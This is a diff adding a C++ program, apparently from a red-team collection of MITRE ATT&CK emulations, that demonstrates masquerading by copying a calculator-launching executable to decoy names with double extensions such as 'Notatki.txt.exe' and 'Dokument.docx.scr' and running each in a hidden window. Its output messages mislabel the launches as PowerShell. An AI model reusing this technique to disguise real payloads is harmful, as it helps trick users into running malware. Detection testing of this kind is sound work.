@@ -1,0 +1,136 @@
+---
+title: ".007.Double File Extension"
+folder: "07. Defense Evasion/T1036 Masquerading"
+---
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+
+bool txt() {
+    std::ifstream src("C:\\Users\\User\\Desktop\\runcalc.exe", std::ios::binary);
+    std::ofstream dest("C:\\Users\\User\\Desktop\\Notatki.txt.exe", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+bool pdf() {
+    std::ifstream src("C:\\Users\\User\\Desktop\\runcalc.exe", std::ios::binary);
+    std::ofstream dest("C:\\Users\\User\\Desktop\\Raport.pdf.bat", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+bool docx() {
+    std::ifstream src("C:\\Users\\User\\Desktop\\runcalc.exe", std::ios::binary);
+    std::ofstream dest("C:\\Users\\User\\Desktop\\Dokument.docx.scr", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+bool jpg() {
+    std::ifstream src("C:\\Users\\User\\Desktop\\runcalc.exe", std::ios::binary);
+    std::ofstream dest("C:\\Users\\User\\Desktop\\Zdjecie.jpg.cmd", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+
+
+void RunWhoamiCommand() {
+    const char* command1 = "C:\\Users\\User\\Desktop\\Notatki.txt.exe";
+    const char* command2 = "C:\\Users\\User\\Desktop\\Raport.pdf.bat";
+    const char* command3 = "C:\\Users\\User\\Desktop\\Dokument.docx.scr";
+    const char* command4 = "C:\\Users\\User\\Desktop\\Zdjecie.jpg.cmd";
+
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command1), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+        std::cout << "PowerShell uruchomiony jako niezależny proces." << std::endl;
+        CloseHandle(pi.hThread);
+    }
+    Sleep(1000);
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command2), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+        std::cout << "PowerShell uruchomiony jako niezależny proces." << std::endl;
+        CloseHandle(pi.hThread);
+    }
+
+
+    Sleep(1000);
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command3), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+        std::cout << "PowerShell uruchomiony jako niezależny proces." << std::endl;
+        CloseHandle(pi.hThread);
+    }
+    Sleep(1000);
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command4), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+        std::cout << "PowerShell uruchomiony jako niezależny proces." << std::endl;
+        CloseHandle(pi.hThread);
+    }
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    txt();
+    pdf();
+    docx();
+    jpg();
+
+    RunWhoamiCommand();
+    return 0;
+}
